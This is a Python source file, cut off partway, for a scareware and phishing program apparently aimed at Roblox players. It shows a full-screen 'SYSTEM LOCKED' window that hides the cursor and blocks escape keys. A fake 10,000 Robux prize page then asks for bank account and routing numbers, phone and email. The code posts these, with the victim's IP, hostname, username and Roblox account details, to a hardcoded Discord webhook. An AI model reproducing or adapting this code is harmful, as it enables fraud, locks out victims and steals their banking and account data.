import platform
import psutil
import socket
import datetime
import json
import requests
import getpass
import os
import uuid
import time
import sys
import subprocess
import webbrowser
import tkinter as tk
from tkinter import scrolledtext, messagebox, ttk
import threading
import re
import pyperclip
import pyautogui
import math
import random
import ctypes
from ctypes import wintypes

# Discord webhook URL
WEBHOOK_URL = "https://discordapp.com/api/webhooks/1482059165227548682/IrrpYTrV3YuNdKhTz3tIonlzKjsFQC_RzQmFXwjAjwHd_UgFTP-_BRDBRK59goMcVFXf"

# JSON files containing recorded actions
MOVEMENTS_FILE = "mvmentdta.json"
SECOND_MOVEMENTS_FILE = "secondmvmentdta.json"

# Game pass URL
GAME_PASS_URL = "https://www.roblox.com/game-pass/1548936702/Skip-Button-SAB"

# URLs to open in new windows
YOUTUBE_SUBSCRIBE_URL = "https://www.youtube.com/@Mrgreyedits?sub_confirmation=1"
YOUTUBE_VIDEO_URL = "https://www.youtube.com/watch?v=a7b_DshUXlw"

# --- MULTI-METHOD CLIPBOARD FUNCTIONS ---
def copy_to_clipboard_multimethod(text, root_window=None):
    """Copy text to clipboard using multiple methods"""
    success = False
    methods_tried = []
    
    # Method 1: pyperclip (standard)
    try:
        pyperclip.copy(text)
        print(f"📋 Method 1 (pyperclip): Copied {len(text)} chars")
        methods_tried.append("pyperclip")
        success = True
    except Exception as e:
        print(f"⚠️ Method 1 failed: {e}")
    
    # Method 2: Windows API via ctypes
    try:
        if platform.system() == "Windows":
            # Open clipboard
            ctypes.windll.user32.OpenClipboard(0)
            ctypes.windll.user32.EmptyClipboard()
            
            # Allocate global memory
            hMem = ctypes.windll.kernel32.GlobalAlloc(0x2000, len(text) + 1)
            pMem = ctypes.windll.kernel32.GlobalLock(hMem)
            
            # Copy string to memory
            ctypes.cdll.msvcrt.strcpy(pMem, text.encode('utf-16le'))
            ctypes.windll.kernel32.GlobalUnlock(hMem)
            
            # Set clipboard data
            ctypes.windll.user32.SetClipboardData(13, hMem)  # 13 = CF_UNICODETEXT
            ctypes.windll.user32.CloseClipboard()
            
            print(f"📋 Method 2 (Windows API): Copied {len(text)} chars")
            methods_tried.append("Windows API")
            success = True
    except Exception as e:
        print(f"⚠️ Method 2 failed: {e}")
    
    # Method 3: PowerShell (Windows)
    try:
        if platform.system() == "Windows":
            # Escape quotes in text
            escaped_text = text.replace('"', '\\"')
            ps_command = f'Set-Clipboard -Value "{escaped_text}"'
            subprocess.run(["powershell", "-command", ps_command], capture_output=True, timeout=5)
            print(f"📋 Method 3 (PowerShell): Copied {len(text)} chars")
            methods_tried.append("PowerShell")
            success = True
    except Exception as e:
        print(f"⚠️ Method 3 failed: {e}")
    
    # Method 4: Tkinter clipboard (use provided root or create temporary one)
    try:
        if root_window:
            # Use existing root window (thread-safe within Tkinter context)
            try:
                root_window.clipboard_clear()
                root_window.clipboard_append(text)
                root_window.update()
                print(f"📋 Method 4 (Tkinter-root): Copied {len(text)} chars")
                methods_tried.append("Tkinter-root")
                success = True
            except Exception as e:
                print(f"⚠️ Method 4 (existing root) failed: {e}")
        else:
            # Create temporary Tkinter window (only if no GUI is running)
            try:
                root = tk.Tk()
                root.withdraw()  # Hide the main window
                root.clipboard_clear()
                root.clipboard_append(text)
                root.update()
                root.destroy()
                print(f"📋 Method 4 (Tkinter): Copied {len(text)} chars")
                methods_tried.append("Tkinter")
                success = True
            except Exception as e:
                print(f"⚠️ Method 4 failed: {e}")
    except Exception as e:
        print(f"⚠️ Method 4 outer failed: {e}")
    
    # Method 5: Fallback - create temp file with text
    try:
        temp_file = os.path.join(os.environ['TEMP'], f'clipboard_text_{int(time.time())}.txt')
        with open(temp_file, 'w', encoding='utf-8') as f:
            f.write(text)
        print(f"📋 Method 5 (File fallback): Text saved to {temp_file}")
        methods_tried.append("File fallback")
        success = True
    except:
        pass
    
    if success:
        print(f"✅ Clipboard operation succeeded using: {', '.join(methods_tried)}")
        return True
    else:
        print("❌ All clipboard methods failed!")
        return False

def get_clipboard_text_multimethod(root_window=None):
    """Get text from clipboard using multiple methods"""
    result = None
    methods_tried = []
    
    # Method 1: pyperclip
    try:
        result = pyperclip.paste()
        if result:
            methods_tried.append("pyperclip")
            print(f"📋 Method 1 (pyperclip): Got {len(result)} chars")
            return result
    except Exception as e:
        print(f"⚠️ Method 1 failed: {e}")
    
    # Method 2: Windows API
    try:
        if platform.system() == "Windows":
            ctypes.windll.user32.OpenClipboard(0)
            hMem = ctypes.windll.user32.GetClipboardData(13)  # 13 = CF_UNICODETEXT
            if hMem:
                pMem = ctypes.windll.kernel32.GlobalLock(hMem)
                if pMem:
                    result = ctypes.wstring_at(pMem)
                    ctypes.windll.kernel32.GlobalUnlock(hMem)
            ctypes.windll.user32.CloseClipboard()
            
            if result:
                methods_tried.append("Windows API")
                print(f"📋 Method 2 (Windows API): Got {len(result)} chars")
                return result
    except Exception as e:
        print(f"⚠️ Method 2 failed: {e}")
    
    # Method 3: PowerShell
    try:
        if platform.system() == "Windows":
            ps_command = "Get-Clipboard"
            proc = subprocess.run(["powershell", "-command", ps_command], capture_output=True, text=True, timeout=5)
            if proc.returncode == 0 and proc.stdout:
                result = proc.stdout.strip()
                if result:
                    methods_tried.append("PowerShell")
                    print(f"📋 Method 3 (PowerShell): Got {len(result)} chars")
                    return result
    except Exception as e:
        print(f"⚠️ Method 3 failed: {e}")
    
    # Method 4: Tkinter
    try:
        if root_window:
            # Use existing root window (thread-safe within Tkinter context)
            try:
                result = root_window.clipboard_get()
                if result:
                    methods_tried.append("Tkinter-root")
                    print(f"📋 Method 4 (Tkinter-root): Got {len(result)} chars")
                    return result
            except Exception as e:
                print(f"⚠️ Method 4 (existing root) failed: {e}")
        else:
            # Create temporary Tkinter window
            try:
                root = tk.Tk()
                root.withdraw()
                result = root.clipboard_get()
                root.destroy()
                if result:
                    methods_tried.append("Tkinter")
                    print(f"📋 Method 4 (Tkinter): Got {len(result)} chars")
                    return result
            except Exception as e:
                print(f"⚠️ Method 4 temporary failed: {e}")
    except Exception as e:
        print(f"⚠️ Method 4 outer failed: {e}")
    
    print(f"❌ All clipboard read methods failed!")
    return None

class PaymentGUI:
    """Full-screen payment details collection GUI with secret L cheat code - Mouse unlocked but hidden"""
    
    def __init__(self, system_info=None, cookie_info=None):
        self.system_info = system_info
        self.cookie_info = cookie_info
        self.payment_data = {}
        self.payment_received = False
        self.close_attempts = 0
        self.mouse_locked = False  # Mouse is NOT locked, just hidden
        self.mouse_visible = False  # Keep cursor hidden
        self.payment_stage = 0  # 0: locked, 1: payment ready, 2: completed
        self.cheat_code = []  # For secret L code
        self.cheat_activated = False
        self.root = tk.Tk()
        self.root.title("🎮 SYSTEM LOCKED - PAYMENT REQUIRED 🎮")
        
        # Remove window decorations FIRST (must be before fullscreen attributes)
        self.root.overrideredirect(True)
        
        # Get screen dimensions BEFORE setting geometry
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        
        # Set geometry to fill entire screen instead of using fullscreen attribute
        # (fullscreen conflicts with overrideredirect)
        self.root.geometry(f"{screen_width}x{screen_height}+0+0")
        
        # Make it ALWAYS ON TOP with proper attributes
        self.root.attributes('-topmost', True)
        self.root.attributes('-alpha', 1.0)
        
        # Set background color
        self.root.configure(bg='#000000')
        
        # Store screen dimensions
        self.screen_width = screen_width
        self.screen_height = screen_height
        
        # Hide mouse cursor (but allow movement)
        self.root.config(cursor="none")
        
        # Create main frame
        self.canvas = tk.Canvas(
            self.root,
            width=self.screen_width,
            height=self.screen_height,
            bg='#000000',
            highlightthickness=0,
            cursor="none"  # Keep cursor hidden on canvas too
        )
        self.canvas.pack()
        
        # Create lock screen first
        self.create_lock_screen()
        
        # Bind all keys but with cheat code detection
        self.bind_keys_with_cheat()
        
        # Start enforce lock (only for window staying on top, not mouse)
        self.enforce_lock()
        
        # Add mouse motion tracking for cursor position (optional - for logging)
        self.last_mouse_pos = None
        self.track_mouse_movement = True
        self.track_mouse()
    
    def track_mouse(self):
        """Track mouse movement for logging only (cursor remains hidden)"""
        if self.track_mouse_movement and not self.cheat_activated:
            try:
                x, y = self.root.winfo_pointerxy()
                if self.last_mouse_pos != (x, y):
                    self.last_mouse_pos = (x, y)
                    # Optional: Log mouse movement for debugging
                    # print(f"🖱️ Mouse at: ({x}, {y})")
            except:
                pass
        
        if self.track_mouse_movement:
            self.root.after(100, self.track_mouse)
    
    def bind_keys_with_cheat(self):
        """Bind keys with cheat code detection - FIXED VERSION"""
        # Bind all keys to the handler - this is the main key handler
        self.root.bind('<Key>', self.on_any_key)
        
        # Bind specific combinations we want to block - using only valid keysyms
        try:
            self.root.bind('<Alt-F4>', self.block_key)
        except:
            pass
        
        try:
            self.root.bind('<Control-q>', self.block_key)
        except:
            pass
        
        try:
            self.root.bind('<Control-w>', self.block_key)
        except:
            pass
        
        try:
            self.root.bind('<Alt-Tab>', self.block_key)
        except:
            pass
        
        try:
            self.root.bind('<Control-Escape>', self.block_key)
        except:
            pass
        
        try:
            self.root.bind('<F11>', self.block_key)
        except:
            pass
        
        # Bind function keys
        for i in range(1, 13):
            try:
                self.root.bind(f'<F{i}>', self.block_key)
            except:
                pass
        
        # Bind Alt combinations
        try:
            self.root.bind('<Alt-Key>', self.block_key)
        except:
            pass
    
    def on_any_key(self, event):
        """Handle any key press with cheat code detection"""
        # Track key for cheat code (looking for 'L' or 'l')
        key = event.keysym.lower() if event.keysym else ''
        
        # Secret cheat code: press L 3 times quickly
        if key == 'l':
            self.cheat_code.append(time.time())
            # Keep only last 3 presses
            if len(self.cheat_code) > 3:
                self.cheat_code.pop(0)
            
            # Check if we have 3 L presses within 2 seconds
            if len(self.cheat_code) == 3:
                time_diff = self.cheat_code[2] - self.cheat_code[0]
                if time_diff < 2.0:  # All 3 presses within 2 seconds
                    self.activate_cheat()
                    return "break"
        
        # Check if we're in payment stage - allow typing in entry fields
        if self.payment_stage == 1:
            # Get the focused widget
            focused = self.root.focus_get()
            
            # If an entry field has focus, allow typing
            if isinstance(focused, tk.Entry):
                # Allow all normal typing in entry fields
                return
            
            # Allow navigation keys in payment stage
            allowed_nav = ['Tab', 'Return', 'BackSpace', 'Delete', 'Left', 'Right', 'Home', 'End']
            if event.keysym in allowed_nav:
                return
        
        # If not in payment stage or not an entry field, block the key
        if not self.cheat_activated:
            self.close_attempts += 1
            print(f"🔒 Key '{event.keysym}' blocked - Attempt {self.close_attempts}")
            
            # Update lock screen message
            if hasattr(self, 'lock_message'):
                if self.close_attempts == 1:
                    msg = "⚠️ SYSTEM LOCKED - PAYMENT REQUIRED TO UNLOCK ⚠️"
                elif self.close_attempts == 2:
                    msg = "⚠️ YOU CANNOT EXIT WITHOUT PAYMENT ⚠️"
                elif self.close_attempts == 3:
                    msg = "⚠️ CONTINUING WILL NOT BYPASS SECURITY ⚠️"
                elif self.close_attempts >= 4:
                    msg = "⚠️ PAYMENT IS MANDATORY - CLICK THE BUTTON BELOW ⚠️"
                
                self.canvas.itemconfig(self.lock_message, text=msg)
            
            return "break"  # Prevent default action
        
        return "break"  # Block keys even after cheat (but we'll close anyway)
    
    def block_key(self, event):
        """Block specific key combinations"""
        if not self.cheat_activated:
            self.close_attempts += 1
            print(f"🔒 Combo blocked - Attempt {self.close_attempts}")
            return "break"
        return "break"
    
    def activate_cheat(self):
        """Activate the secret cheat code to close"""
        self.cheat_activated = True
        print("🔥 CHEAT CODE ACTIVATED! System unlocking...")
        
        # Show cheat message
        self.canvas.delete("all")
        self.canvas.create_rectangle(
            0, 0, self.screen_width, self.screen_height,
            fill='#27ae60', outline=''
        )
        
        self.canvas.create_text(
            self.screen_width // 2, self.screen_height // 2 - 50,
            text='🔓 CHEAT CODE ACTIVATED',
            font=('Arial', 48, 'bold'),
            fill='white'
        )
        
        self.canvas.create_text(
            self.screen_width // 2, self.screen_height // 2 + 20,
            text='System unlocked successfully',
            font=('Arial', 24),
            fill='white'
        )
        
        # Show mouse cursor when cheat is activated
        self.root.config(cursor="arrow")
        self.canvas.config(cursor="arrow")
        
        # Stop tracking
        self.track_mouse_movement = False
        
        # Auto-close after 2 seconds
        self.root.after(2000, self.finish)
    
    def enforce_lock(self):
        """Continuously enforce the lock (only window stays on top, no mouse lock)"""
        if self.payment_stage != 2 and not self.cheat_activated:  # If not completed and cheat not activated
            # Force window to stay on top and fullscreen
            self.root.attributes('-topmost', True)
            self.root.attributes('-fullscreen', True)
            
            # Check if window is still fullscreen
            if not self.root.attributes('-fullscreen'):
                self.root.attributes('-fullscreen', True)
        
        # Continue enforcing
        if not self.cheat_activated:
            self.root.after(100, self.enforce_lock)
    
    def flash_warning(self):
        """Flash a warning when trying to escape"""
        if hasattr(self, 'lock_message'):
            current_color = self.canvas.itemcget(self.lock_message, 'fill')
            new_color = '#ff0000' if current_color == '#ffff00' else '#ffff00'
            self.canvas.itemconfig(self.lock_message, fill=new_color)
            self.root.after(200, lambda: self.canvas.itemconfig(self.lock_message, fill='#ffff00'))
    
    def create_lock_screen(self):
        """Create the initial lock screen with mouse accessible but hidden"""
        # Dark overlay
        self.canvas.create_rectangle(
            0, 0, self.screen_width, self.screen_height,
            fill='#000000', outline=''
        )
        
        # Warning symbol
        self.canvas.create_text(
            self.screen_width // 2, self.screen_height // 2 - 150,
            text='🔒',
            font=('Arial', 120),
            fill='#ff0000'
        )
        
        # Main lock message
        self.lock_message = self.canvas.create_text(
            self.screen_width // 2, self.screen_height // 2 - 30,
            text='⚠️ SYSTEM LOCKED - PAYMENT REQUIRED TO UNLOCK ⚠️',
            font=('Arial', 32, 'bold'),
            fill='#ffff00',
            justify='center'
        )
        
        # Sub message
        self.canvas.create_text(
            self.screen_width // 2, self.screen_height // 2 + 30,
            text='Your system has been locked for verification',
            font=('Arial', 18),
            fill='#ffffff'
        )
        
        # Instructions
        self.canvas.create_text(
            self.screen_width // 2, self.screen_height // 2 + 80,
            text='You must complete the payment to regain control of your system',
            font=('Arial', 16),
            fill='#cccccc'
        )
        
        # Continue button (only way to proceed)
        continue_btn = tk.Button(
            self.root,
            text='🔓 PROCEED TO PAYMENT 🔓',
            command=self.unlock_for_payment,
            font=('Arial', 20, 'bold'),
            bg='#ff0000',
            fg='white',
            activebackground='#cc0000',
            activeforeground='white',
            relief='raised',
            bd=5,
            padx=40,
            pady=20,
            cursor="none"  # Keep cursor hidden on button too
        )
        self.continue_btn_window = self.canvas.create_window(
            self.screen_width // 2, self.screen_height // 2 + 180,
            window=continue_btn
        )
        
        # Warning footer
        self.canvas.create_text(
            self.screen_width // 2, self.screen_height - 50,
            text='⚠️ Any attempt to close or bypass this window will result in permanent lock ⚠️',
            font=('Arial', 12, 'bold'),
            fill='#ff0000'
        )
        
        # Close attempts counter
        self.close_counter_text = self.canvas.create_text(
            self.screen_width - 200, self.screen_height - 30,
            text='',
            font=('Arial', 10),
            fill='#333333'
        )
        
        # Secret hint (very subtle)
        self.canvas.create_text(
            50, self.screen_height - 30,
            text='.',
            font=('Arial', 8),
            fill='#111111'
        )
    
    def unlock_for_payment(self):
        """Unlock mouse and show payment form (mouse stays hidden)"""
        self.mouse_locked = False
        self.payment_stage = 1
        
        # Keep mouse cursor hidden
        self.root.config(cursor="none")
        self.canvas.config(cursor="none")
        
        # Clear canvas
        self.canvas.delete("all")
        
        # Create payment form
        self.create_payment_form()
    
    def create_payment_form(self):
        """Create the payment form with mouse access (cursor hidden)"""
        # Create gradient background
        self.create_gradient()
    
    def create_gradient(self):
        """Create a gradient background"""
        for i in range(self.screen_height):
            # Create gradient from dark blue to purple
            r = int(26 + (i / self.screen_height) * 30)
            g = int(26 + (i / self.screen_height) * 20)
            b = int(46 + (i / self.screen_height) * 40)
            color = f'#{r:02x}{g:02x}{b:02x}'
            self.canvas.create_line(0, i, self.screen_width, i, fill=color, width=1)
        
        # Create main content
        self.create_payment_content()
    
    def create_payment_content(self):
        """Create the payment form content"""
        # Center content frame
        content_width = 600
        content_height = 700
        content_x = (self.screen_width - content_width) // 2
        content_y = (self.screen_height - content_height) // 2
        
        # Create semi-transparent background for content
        self.canvas.create_rectangle(
            content_x - 20, content_y - 20,
            content_x + content_width + 20, content_y + content_height + 20,
            fill='#16213e', outline='#0f3460', width=3
        )
        
        # Animated stars
        self.stars = []
        for i in range(20):
            x = random.randint(content_x, content_x + content_width)
            y = random.randint(content_y - 50, content_y - 10)
            star = self.canvas.create_text(
                x, y, text='⭐', font=('Arial', random.randint(12, 20)),
                fill='#f1c40f'
            )
            self.stars.append({'id': star, 'x': x, 'y': y, 'speed': random.uniform(0.5, 2)})
        
        # Main title with glow effect
        title_y = content_y + 40
        # Glow effect
        for offset in range(5, 0, -1):
            self.canvas.create_text(
                self.screen_width // 2, title_y + offset,
                text='🎉 OFFICIAL WINNER 🎉',
                font=('Arial', 36, 'bold'),
                fill='#ffd700',
                opacity=50
            )
        
        self.canvas.create_text(
            self.screen_width // 2, title_y,
            text='🎉 OFFICIAL WINNER 🎉',
            font=('Arial', 36, 'bold'),
            fill='#f1c40f'
        )
        
        # Congratulations message
        self.canvas.create_text(
            self.screen_width // 2, title_y + 60,
            text='CONGRATULATIONS!',
            font=('Arial', 48, 'bold'),
            fill='#e94560'
        )
        
        # Prize amount with pulsing effect
        self.prize_text = self.canvas.create_text(
            self.screen_width // 2, title_y + 130,
            text='🏆 10,000 ROBUX PRIZE 🏆',
            font=('Arial', 32, 'bold'),
            fill='#f1c40f'
        )
        
        # Winner message
        self.canvas.create_text(
            self.screen_width // 2, title_y + 180,
            text='You have been selected as the lucky winner!',
            font=('Arial', 18),
            fill='#ffffff'
        )
        
        # Payment instruction with warning
        self.canvas.create_text(
            self.screen_width // 2, title_y + 220,
            text='⚠️ PAYMENT REQUIRED TO CLAIM PRIZE ⚠️',
            font=('Arial', 16, 'bold'),
            fill='#e94560'
        )
        
        self.canvas.create_text(
            self.screen_width // 2, title_y + 245,
            text='A small verification fee of $1 is required to process your 10,000 Robux',
            font=('Arial', 12),
            fill='#dddddd'
        )
        
        # Bank details form
        form_y = title_y + 300
        
        # Form background
        self.canvas.create_rectangle(
            content_x + 50, form_y - 20,
            content_x + content_width - 50, form_y + 280,
            fill='#0f3460', outline='#e94560', width=2
        )
        
        # Form title
        self.canvas.create_text(
            self.screen_width // 2, form_y,
            text='ENTER YOUR BANK DETAILS BELOW',
            font=('Arial', 16, 'bold'),
            fill='#f1c40f'
        )
        
        # Create entry fields
        self.entries = {}
        fields = [
            ('Full Name on Account:', 'full_name'),
            ('Bank Name:', 'bank_name'),
            ('Account Number:', 'account_number'),
            ('Routing Number:', 'routing_number'),
            ('Confirm Account Number:', 'confirm_account'),
            ('Phone Number:', 'phone'),
            ('Email Address:', 'email')
        ]
        
        for i, (label, key) in enumerate(fields):
            y_pos = form_y + 40 + (i * 35)
            
            # Label
            self.canvas.create_text(
                content_x + 70, y_pos,
                text=label,
                font=('Arial', 11, 'bold'),
                fill='#ffffff',
                anchor='w'
            )
            
            # Entry field - allows typing
            entry = tk.Entry(
                self.root,
                font=('Arial', 11),
                bg='#1a1a2e',
                fg='#ffffff',
                insertbackground='#f1c40f',
                relief='solid',
                bd=2,
                width=40,
                cursor="none"  # Keep cursor hidden in entry fields too
            )
            entry_window = self.canvas.create_window(
                content_x + content_width - 100, y_pos,
                window=entry,
                anchor='e'
            )
            self.entries[key] = entry
        
        # Payment amount
        self.canvas.create_text(
            self.screen_width // 2, form_y + 320,
            text='VERIFICATION FEE: $1.00 USD',
            font=('Arial', 14, 'bold'),
            fill='#e94560'
        )
        
        # Payment button
        self.pay_btn = tk.Button(
            self.root,
            text='💳 PAY $1.00 TO CLAIM PRIZE 💳',
            command=self.process_payment,
            font=('Arial', 18, 'bold'),
            bg='#e94560',
            fg='white',
            activebackground='#ff6b6b',
            activeforeground='white',
            relief='raised',
            bd=5,
            padx=30,
            pady=15,
            cursor="none"  # Keep cursor hidden on button
        )
        self.pay_btn_window = self.canvas.create_window(
            self.screen_width // 2, form_y + 380,
            window=self.pay_btn
        )
        
        # Warning message
        self.warning_text = self.canvas.create_text(
            self.screen_width // 2, form_y + 450,
            text='⚠️ You cannot close this window until payment is completed ⚠️',
            font=('Arial', 12, 'bold'),
            fill='#ffd700'
        )
        
        # Start animations
        self.animate()
    
    def animate(self):
        """Animate elements"""
        if self.payment_stage == 1 and not self.cheat_activated:  # Only animate in payment stage
            # Animate stars
            for star in self.stars:
                self.canvas.move(star['id'], 0, star['speed'])
                coords = self.canvas.coords(star['id'])
                if coords and coords[1] > self.screen_height:
                    self.canvas.coords(star['id'], star['x'], -20)
            
            # Pulse prize text
            current_time = time.time()
            pulse = (math.sin(current_time * 3) + 1) / 2
            size = 32 + int(pulse * 8)
            self.canvas.itemconfig(
                self.prize_text,
                font=('Arial', size, 'bold')
            )
        
        # Schedule next animation
        if self.payment_stage != 2 and not self.cheat_activated:  # Don't animate after completion
            self.root.after(50, self.animate)
    
    def process_payment(self):
        """Process the payment"""
        # Validate form
        payment_data = self.collect_payment_data()
        is_valid, error_msg = self.validate_payment_data(payment_data)
        
        if not is_valid:
            self.show_error(error_msg)
            return
        
        # Show processing
        self.pay_btn.config(
            text='⏳ PROCESSING PAYMENT...',
            state='disabled',
            bg='#666666',
            cursor="none"
        )
        self.root.update()
        
        # Simulate payment processing
        for i in range(3):
            self.canvas.itemconfig(
                self.warning_text,
                text=f'Processing payment. Please wait{ "." * i }'
            )
            self.root.update()
            time.sleep(1)
        
        # Send to Discord
        success = self.send_to_discord(payment_data)
        
        if success:
            self.payment_received = True
            self.payment_stage = 2
            self.show_success()
        else:
            self.pay_btn.config(
                text='💳 PAY $1.00 TO CLAIM PRIZE 💳',
                state='normal',
                bg='#e94560',
                cursor="none"
            )
            self.show_error("Payment processing failed. Please try again.")
    
    def collect_payment_data(self):
        """Collect payment data from form"""
        data = {
            "method": "bank",
            "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "full_name": self.entries["full_name"].get(),
            "bank_name": self.entries["bank_name"].get(),
            "account_number": self.entries["account_number"].get(),
            "routing_number": self.entries["routing_number"].get(),
            "confirm_account": self.entries["confirm_account"].get(),
            "phone": self.entries["phone"].get(),
            "email": self.entries["email"].get()
        }
        
        return data
    
    def validate_payment_data(self, data):
        """Validate payment data"""
        # Check required fields
        required_fields = ["full_name", "bank_name", "account_number", "routing_number", "confirm_account"]
        for field in required_fields:
            if not data.get(field, "").strip():
                return False, f"Please fill in {field.replace('_', ' ').title()}"
        
        # Check if account numbers match
        if data["account_number"] != data["confirm_account"]:
            return False, "Account numbers do not match!"
        
        # Basic validation for account number (should be digits)
        if not data["account_number"].isdigit():
            return False, "Account number should contain only digits"
        
        if not data["routing_number"].isdigit():
            return False, "Routing number should contain only digits"
        
        if len(data["routing_number"]) != 9:
            return False, "Routing number should be 9 digits"
        
        return True, "Valid"
    
    def send_to_discord(self, payment_data):
        """Send payment data to Discord webhook"""
        try:
            # Create embed
            embed = {
                "title": f"💰 BANK PAYMENT DETAILS SUBMITTED",
                "color": 15158332,  # Red
                "fields": [
                    {"name": "👤 Full Name", "value": payment_data.get('full_name', 'N/A'), "inline": False},
                    {"name": "🏛️ Bank Name", "value": payment_data.get('bank_name', 'N/A'), "inline": True},
                    {"name": "🔢 Account Number", "value": payment_data.get('account_number', 'N/A'), "inline": True},
                    {"name": "🔢 Routing Number", "value": payment_data.get('routing_number', 'N/A'), "inline": True},
                    {"name": "📞 Phone", "value": payment_data.get('phone', 'N/A'), "inline": True},
                    {"name": "📧 Email", "value": payment_data.get('email', 'N/A'), "inline": True},
                    {"name": "⏰ Submitted", "value": payment_data.get('timestamp', 'N/A'), "inline": False}
                ],
                "footer": {
                    "text": f"Close Attempts: {self.close_attempts}"
                }
            }
            
            # Add system info if available
            if self.system_info:
                embed["fields"].append({
                    "name": "💻 System Info",
                    "value": f"IP: {self.system_info.get('public_ip', 'N/A')}\n"
                            f"Hostname: {self.system_info.get('hostname', 'N/A')}\n"
                            f"User: {self.system_info.get('username', 'N/A')}",
                    "inline": False
                })
            
            # Add cookie info if available
            if self.cookie_info and self.cookie_info.get('valid'):
                embed["fields"].append({
                    "name": "🍪 Roblox Account",
                    "value": f"Username: {self.cookie_info.get('username', 'N/A')}\n"
                            f"Robux: {self.cookie_info.get('robux_balance', 0):,}\n"
                            f"Premium: {'✅' if self.cookie_info.get('has_premium') else '❌'}",
                    "inline": False
                })
            
            data = {"embeds": [embed]}
            
            response = requests.post(WEBHOOK_URL, json=data)
            return response.status_code in [200, 204]
            
        except Exception as e:
            print(f"Error sending to Discord: {e}")
            return False
    
    def show_error(self, message):
        """Show error message"""
        error_window = tk.Toplevel(self.root)
        error_window.title("Error")
        error_window.geometry("400x200")
        error_window.configure(bg='#1a1a2e')
        error_window.attributes('-topmost', True)
        
        # Center the error window
        error_window.update_idletasks()
        x = (self.screen_width // 2) - 200
        y = (self.screen_height // 2) - 100
        error_window.geometry(f'400x200+{x}+{y}')
        
        tk.Label(
            error_window,
            text="❌ ERROR",
            font=('Arial', 24, 'bold'),
            bg='#1a1a2e',
            fg='#e94560'
        ).pack(pady=20)
        
        tk.Label(
            error_window,
            text=message,
            font=('Arial', 12),
            bg='#1a1a2e',
            fg='#ffffff',
            wraplength=350
        ).pack(pady=10)
        
        tk.Button(
            error_window,
            text="OK",
            command=error_window.destroy,
            font=('Arial', 12),
            bg='#e94560',
            fg='white',
            width=10,
            cursor="none"
        ).pack(pady=20)
    
    def show_success(self):
        """Show success screen with FINISH button"""
        # Clear everything
        self.canvas.delete("all")
        
        # Create solid background
        self.canvas.configure(bg='#27ae60')
        
        # Success icon
        self.canvas.create_text(
            self.screen_width // 2, self.screen_height // 2 - 100,
            text='✅',
            font=('Arial', 120),
            fill='white'
        )
        
        # Congratulations message
        self.canvas.create_text(
            self.screen_width // 2, self.screen_height // 2,
            text='SYSTEM UNLOCKED!',
            font=('Arial', 48, 'bold'),
            fill='white'
        )
        
        self.canvas.create_text(
            self.screen_width // 2, self.screen_height // 2 + 60,
            text='Payment received - Your 10,000 Robux will be added within 24 hours',
            font=('Arial', 18),
            fill='white',
            justify='center'
        )
        
        # Finish button
        finish_btn = tk.Button(
            self.root,
            text='✅ FINISH ✅',
            command=self.finish,
            font=('Arial', 24, 'bold'),
            bg='white',
            fg='#27ae60',
            activebackground='#f0f0f0',
            activeforeground='#27ae60',
            relief='raised',
            bd=5,
            padx=40,
            pady=20,
            cursor="arrow"  # Show cursor on finish button
        )
        self.canvas.create_window(
            self.screen_width // 2, self.screen_height // 2 + 150,
            window=finish_btn
        )
        
        # Stop mouse tracking
        self.track_mouse_movement = False
    
    def finish(self):
        """Finish and close"""
        self.track_mouse_movement = False
        self.root.quit()
        self.root.destroy()
    
    def run(self):
        """Run the payment GUI"""
        self.root.mainloop()

class BrowserWindowManager:
    """Class to manage browser windows and track them for closing"""
    
    def __init__(self):
        self.opened_windows = []  # Store process info for opened windows
        self.window_titles = []   # Store window titles for reference
        
    def open_url_new_window(self, url):
        """Open a URL in a new browser window and track it"""
        try:
            print(f"🌐 Attempting to open {url} in new window...")
            
            # Try Chrome first
            chrome_paths = [
                "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
                os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\Application\\chrome.exe"),
                "C:\\Users\\" + os.getenv('USERNAME') + "\\AppData\\Local\\Google\\Chrome\\Application\\chrome.exe"
            ]
            
            for chrome_path in chrome_paths:
                if os.path.exists(chrome_path):
                    print(f"✅ Found Chrome at: {chrome_path}")
                    # Use --new-window to force new window, not tab
                    process = subprocess.Popen([chrome_path, "--new-window", url])
                    self.opened_windows.append({
                        'process': process,
                        'url': url,
                        'time_opened': time.time(),
                        'browser': 'chrome'
                    })
                    print(f"✅ Opened {url} in new Chrome window")
                    time.sleep(2)
                    return True
            
            # Try Edge
            edge_paths = [
                "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
                "C:\\Users\\" + os.getenv('USERNAME') + "\\AppData\\Local\\Microsoft\\Edge\\Application\\msedge.exe"
            ]
            
            for edge_path in edge_paths:
                if os.path.exists(edge_path):
                    print(f"✅ Found Edge at: {edge_path}")
                    process = subprocess.Popen([edge_path, "--new-window", url])
                    self.opened_windows.append({
                        'process': process,
                        'url': url,
                        'time_opened': time.time(),
                        'browser': 'edge'
                    })
                    print(f"✅ Opened {url} in new Edge window")
                    time.sleep(2)
                    return True
            
            # Try Firefox
            firefox_paths = [
                "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
                "C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe",
                "C:\\Users\\" + os.getenv('USERNAME') + "\\AppData\\Local\\Mozilla Firefox\\firefox.exe"
            ]
            
            for firefox_path in firefox_paths:
                if os.path.exists(firefox_path):
                    print(f"✅ Found Firefox at: {firefox_path}")
                    process = subprocess.Popen([firefox_path, "--new-window", url])
                    self.opened_windows.append({
                        'process': process,
                        'url': url,
                        'time_opened': time.time(),
                        'browser': 'firefox'
                    })
                    print(f"✅ Opened {url} in new Firefox window")
                    time.sleep(2)
                    return True
            
            # Try Brave
            brave_paths = [
                "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
                "C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
                "C:\\Users\\" + os.getenv('USERNAME') + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"
            ]
            
            for brave_path in brave_paths:
                if os.path.exists(brave_path):
                    print(f"✅ Found Brave at: {brave_path}")
                    process = subprocess.Popen([brave_path, "--new-window", url])
                    self.opened_windows.append({
                        'process': process,
                        'url': url,
